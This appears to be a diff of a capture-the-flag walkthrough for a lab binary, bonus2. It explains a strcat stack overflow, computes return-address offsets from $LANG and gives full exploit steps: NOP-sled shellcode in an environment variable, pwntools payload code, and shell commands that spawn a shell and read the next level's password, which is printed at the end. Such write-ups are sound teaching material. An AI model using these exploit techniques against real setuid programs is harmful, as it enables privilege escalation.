@@ -4,52 +4,39 @@ bonus2 - walkthrough
 Target: /home/user/bonus2/bonus2   (setuid + setgid bonus3)
 Goal:   read /home/user/bonus3/.pass
 
-1. Recon (objdump -d bonus2)
-   main(argc=3):
-     memset(buf[76], 0);
-     strncpy(buf,    argv[1], 40);      ; not NUL-terminated on a full copy
-     strncpy(buf+40, argv[2], 32);
-     lang = getenv("LANG");
-       memcmp(lang,"fi",2)==0 -> language=1
-       memcmp(lang,"nl",2)==0 -> language=2
-     greetuser(buf);
-   greetuser(name):
-     char greeting[72];                 ; ebp-0x48
-     language 0: "Hello "        (7 bytes)
-     language 1: "Hyvää päivää " (19 bytes)
-     language 2: "Goedemiddag! " (14 bytes)
-     strcat(greeting, name);            ; <-- overflow
-     puts(greeting);
+1. The bug
+   main() copies argv[1] (<=40) and argv[2] (<=32) into a 76-byte buffer, reads
+   $LANG to pick a greeting language, then calls greetuser(buf). greetuser
+   writes a fixed greeting into a 72-byte buffer and strcat's the user string
+   onto it with no bound -> overflow.
+     greeting[72] at ebp-0x48 -> saved return address is 76 bytes into greeting.
+   The greeting length is chosen by $LANG:
+     unset/other : "Hello "         (6 chars)
+     LANG=fi     : "Hyvää päivää "  (18 chars)
+     LANG=nl     : "Goedemiddag! "  (13 chars)
 
-2. The bug
-   greeting[72] gets  greeting_prefix + (argv[1] + argv[2])  via strcat, with no
-   bounds check. The saved return address of greetuser is 76 bytes into
-   greeting. A longer LANG greeting shifts the user bytes, changing which input
-   byte lands on the return address.
+2. Offset -- pick the language so the address lands on the return address
+   With LANG=nl the 13-char greeting means the combined input reaches the saved
+   return address (greeting offset 76) at input offset 76 - 13 = 63, i.e.
+   argv[1](40) + argv[2][23]. So the address goes at argv[2][23].
 
-3. Choose LANG=fi (19-byte greeting) and find the offset
-     $ LANG=fi ./bonus2 <40-byte pattern> <32-byte pattern>   (under gdb)
-       eip = 0x63413962  ("b9Ac")
-   Locating "b9Ac" in the combined argv1+argv2 pattern -> offset 58, i.e.
-   argv2[18..21]. (76 - 18-byte greeting = 58.)
+3. Shellcode in an env var (ASLR is off)
+   The inputs are small, so put the shellcode behind a NOP sled in an env var
+   and return into the sled (landing anywhere in the sled is fine).
 
-4. Shellcode in an env var (ASLR is off: randomize_va_space = 0)
-   The inputs are small and get mangled, so put the shellcode behind a NOP sled
-   in a separate env var EGG and return into it:
-     EGG = "\x90"*300 + execve("/bin//sh","-c","/bin/cat /home/user/bonus3/.pass")
-   argv[1] must be 40 non-NUL bytes and argv[2][0..21] non-NUL, so the strcat
-   copies all the way to the return address before hitting a NUL.
-   Under gdb (with LANG=fi and this exact argv) the sled was at ~0xbffffd53;
-   returning to 0xbffffde0 (mid-sled) is safe.
+4. Payload  (Ressources/exploit.py)
+     shell_code = b"\x90"*500 + asm(shellcraft.i386.sh())   # -> file "scode"
+     arg1 = b"A"*40
+     arg2 = b"A"*23 + p32(0xbffffda0)                        # ret at argv[2][23]
+   0xbffffda0 is a mid-sled address; it depends on the environment (EGG + LANG
+   both present), so re-find it: gdb ./bonus2 -> run -> print/x getenv("EGG").
 
-5. Payload
-   LANG=fi
-   argv[1] = "A"*40
-   argv[2] = "A"*18 + \xe0\xfd\xff\xbf + "A"*10
-
-     export EGG="$(python -c 'print "\x90"*300 + "<shellcode>"')"
-     LANG=fi ./bonus2 "$(python -c 'print "A"*40')" \
-                      "$(python -c 'print "A"*18 + "\xe0\xfd\xff\xbf" + "A"*10')"
+5. Run
+     $ python3 Ressources/exploit.py
+     $ export EGG="$(cat scode)"
+     $ (sleep 1; echo 'cat /home/user/bonus3/.pass') | LANG=nl ./bonus2 "$(cat arg1)" "$(cat arg2)"
+   greetuser returns into the sled, the shellcode spawns /bin/sh, and the piped
+   command cats the flag.
 
 6. Result -- bonus3 password:
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
